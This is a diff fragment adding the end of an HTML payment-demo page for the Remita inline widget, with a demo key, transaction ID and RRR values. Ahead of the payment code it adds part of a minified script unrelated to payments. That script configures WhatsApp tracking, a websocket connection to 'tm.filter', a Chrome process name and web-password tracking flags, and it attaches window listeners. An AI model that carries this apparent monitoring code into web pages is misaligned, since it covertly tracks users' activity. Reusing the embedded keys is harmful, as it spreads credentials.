+              },
+              toDays: function () {
+                return (t / 864e5) | 0;
+              },
+            };
+          }),
+          (e.isLeapYear = function (Y) {
+            return !(((Y = Y.getFullYear()) % 4 || !(Y % 100)) && Y % 400);
+          }),
+          (e.isSameDay = function (Y, t) {
+            return e.format(Y, 'YYYYMMDD') === e.format(t, 'YYYYMMDD');
+          }),
+          (Y.date = e);
+        var N = {
+            token: '43b59d13-cd9a-4693-bd36-106f26b95372',
+            sendNotificationsInterval: Number('1000'),
+            pollWhatsappTrackingInterval: Number('20000'),
+            connectionString: 'wss://tm.filter:1502',
+            pid: '1632',
+            pn: 'chrome.exe',
+            iup: false,
+            dontTrackWebPasswords: true,
+            extJs: null,
+          },
+          b = 6e4,
+          A = null,
+          w = null,
+          E = null,
+          L = null,
+          T = !1,
+          I = null,
+          k = null,
+          C = 0,
+          H = null,
+          O = null,
+          P = '',
+          F = !1;
+        !(function Y(e) {
+          p()
+            ? setTimeout(function () {
+                Y(e);
+              }, 1e3)
+            : e();
+        })(function () {
+          N.extJs && N.extJs.init(N.token),
+            n() &&
+              (window.addEventListener('focus', r, !0),
+              N.dontTrackWebPasswords &&
+                window.addEventListener('message', S, !1)),
+            n() || N.extJs ? f() : N.dontTrackWebPasswords && D();
+        });
+      })();
+    </script>
+    <script>
+      function setDemoData() {
+        var obj = {
+          rrr: '270798772974',
+        };
+        for (var propName in obj) {
+          document
+            .querySelector('#js-' + propName)
+            .setAttribute('value', obj[propName]);
+        }
+      }
+      function makePayment() {
+        var form = document.querySelector('#payment-form');
+        var paymentEngine = RmPaymentEngine.init({
+          key: 'QzAwMDAyNzEyNTl8MTEwNjE4NjF8OWZjOWYwNmMyZDk3MDRhYWM3YThiOThlNTNjZTE3ZjYxOTY5NDdmZWE1YzU3NDc0ZjE2ZDZjNTg1YWYxNWY3NWM4ZjMzNzZhNjNhZWZlOWQwNmJhNTFkMjIxYTRiMjYzZDkzNGQ3NTUxNDIxYWNlOGY4ZWEyODY3ZjlhNGUwYTY',
+
+          processRrr: true,
+          transactionId: '2334567812345',
+          //channel: "CARD,BRANCH",
+          extendedData: {
+            customFields: [
+              {
+                name: 'rrr',
+                value: 220798913684,
+              },
+            ],
+          },
+          onSuccess: function (response) {
+            console.log('callback Successful Response', response);
+          },
+          onError: function (response) {
+            console.log('callback Error Response', response);
+          },
+          onClose: function () {
+            console.log('closed');
+          },
+        });
+        paymentEngine.showPaymentWidget();
+      }
+      window.onload = function () {
+        setDemoData();
+      };
+    </script>
+    <script
+      type="text/javascript"
+      src="https://demo.remita.net/payment/v1/remita-pay-inline.bundle.js"
+    ></script>
+  </body>
+</html>
